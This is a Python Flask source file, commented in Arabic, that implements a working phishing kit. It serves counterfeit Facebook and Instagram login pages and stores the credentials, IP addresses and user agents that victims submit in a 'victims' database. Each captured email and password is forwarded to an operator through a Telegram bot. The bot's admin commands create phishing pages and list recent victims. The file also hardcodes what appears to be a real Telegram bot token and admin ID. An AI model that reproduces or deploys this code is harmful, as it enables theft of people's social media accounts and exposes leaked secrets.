import os
import logging
from flask import Flask, request, render_template_string
import sqlite3
from telegram import Bot, Update
from telegram.ext import Dispatcher, CommandHandler

# التوكن والآيدي
BOT_TOKEN = "8236056575:AAHI0JHvTGdJiu92sDXiv7dbWMJLxvMY_x4"
ADMIN_ID = "7604667042"

app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)
dispatcher = Dispatcher(bot, None, workers=0)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# قواعد البيانات
def init_db():
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT,
            password TEXT,
            ip_address TEXT,
            user_agent TEXT,
            phishing_page TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            page_name TEXT,
            page_url TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# صفحات التصيد
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - تسجيل الدخول</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; }
        .container { width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h2 style="color: #1877f2; text-align: center;">Facebook</h2>
        <form action="/submit_facebook" method="post">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

INSTAGRAM_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <style>
        body { font-family: Arial; background: #fafafa; }
        .container { width: 350px; margin: 50px auto; background: white; padding: 30px; border: 1px solid #dbdbdb; }
        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <h2 style="text-align: center;">Instagram</h2>
        <form action="/submit_instagram" method="post">
            <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

# أوامر البوت
def start_command(update, context):
    user_id = update.effective_user.id
    if str(user_id) != ADMIN_ID:
        update.message.reply_text("❌ غير مصرح لك باستخدام هذا البوت")
        return
    
    victims_count = get_victims_count()
    pages_count = get_pages_count()
    last_victim = get_last_victim()
    
    welcome_text = f"""
🎣 **بوت التصيد الجهنمي**

📊 **الإحصائيات:**
• عدد الضحايا: {victims_count}
• الصفحات النشطة: {pages_count}
• آخر ضحية: {last_victim}

⚡ **الأوامر:**
/create_facebook - إنشاء صفحة فيسبوك
/create_instagram - إنشاء صفحة انستغرام  
/victims - عرض الضحايا
/stats - الإحصائيات
    """
    
    update.message.reply_text(welcome_text, parse_mode='Markdown')

def create_facebook_command(update, context):
    page_url = f"{request.host_url}facebook_login"
    save_page("فيسبوك", page_url)
    
    bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🌐 **صفحة فيسبوك جاهزة:**\n`{page_url}`",
        parse_mode='Markdown'
    )

def create_instagram_command(update, context):
    page_url = f"{request.host_url}instagram_login"
    save_page("انستغرام", page_url)
    
    bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📸 **صفحة انستغرام جاهزة:**\n`{page_url}`",
        parse_mode='Markdown'
    )

def victims_command(update, context):
    victims = get_recent_victims()
    victims_text = "👥 **آخر 5 ضحايا:**\n\n"
    
    for victim in victims:
        victims_text += f"📧 {victim[1]}\n🔑 {victim[2]}\n🕒 {victim[6]}\n\n"
    
    update.message.reply_text(victims_text, parse_mode='Markdown')

# Routes التصيد
@app.route('/')
def home():
    return "🚀 البوت يعمل بنجاح!"

@app.route('/facebook_login')
def facebook_login():
    return render_template_string(LOGIN_PAGE)

@app.route('/instagram_login')
def instagram_login():
    return render_template_string(INSTAGRAM_PAGE)

@app.route('/submit_facebook', methods=['POST'])
def submit_facebook():
    email = request.form['email']
    password = request.form['password']
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    save_victim(email, password, ip, user_agent, "فيسبوك")
    
    # إرسال إشعار للتليجرام
    bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🎯 **ضحية جديدة - فيسبوك**\n\n📧 `{email}`\n🔑 `{password}`\n🌐 `{ip}`",
        parse_mode='Markdown'
    )
    
    return "تم تسجيل الدخول بنجاح! جاري التوجيه..."

@app.route('/submit_instagram', methods=['POST'])
def submit_instagram():
    username = request.form['username']
    password = request.form['password']
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    save_victim(username, password, ip, user_agent, "انستغرام")
    
    bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🎯 **ضحية جديدة - انستغرام**\n\n👤 `{username}`\n🔑 `{password}`\n🌐 `{ip}`",
        parse_mode='Markdown'
    )
    
    return "تم تسجيل الدخول بنجاح! جاري التوجيه..."

# دوال مساعدة
def save_victim(email, password, ip, user_agent, page):
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO victims (email, password, ip_address, user_agent, phishing_page) VALUES (?, ?, ?, ?, ?)",
        (email, password, ip, user_agent, page)
    )
    conn.commit()
    conn.close()

def save_page(page_name, page_url):
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO pages (page_name, page_url) VALUES (?, ?)",
        (page_name, page_url)
    )
    conn.commit()
    conn.close()

def get_victims_count():
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM victims")
    count = cursor.fetchone()[0]
    conn.close()
    return count

def get_pages_count():
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM pages")
    count = cursor.fetchone()[0]
    conn.close()
    return count

def get_last_victim():
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute("SELECT email, captured_at FROM victims ORDER BY id DESC LIMIT 1")
    result = cursor.fetchone()
    conn.close()
    return f"{result[0]} - {result[1]}" if result else "لا يوجد"

def get_recent_victims():
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM victims ORDER BY id DESC LIMIT 5")
    victims = cursor.fetchall()
    conn.close()
    return victims

# إضافة handlers
dispatcher.add_handler(CommandHandler("start", start_command))
dispatcher.add_handler(CommandHandler("create_facebook", create_facebook_command))
dispatcher.add_handler(CommandHandler("create_instagram", create_instagram_command))
dispatcher.add_handler(CommandHandler("victims", victims_command))

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update = Update.de_json(request.get_json(), bot)
        dispatcher.process_update(update)
        return 'OK'
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'ERROR'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
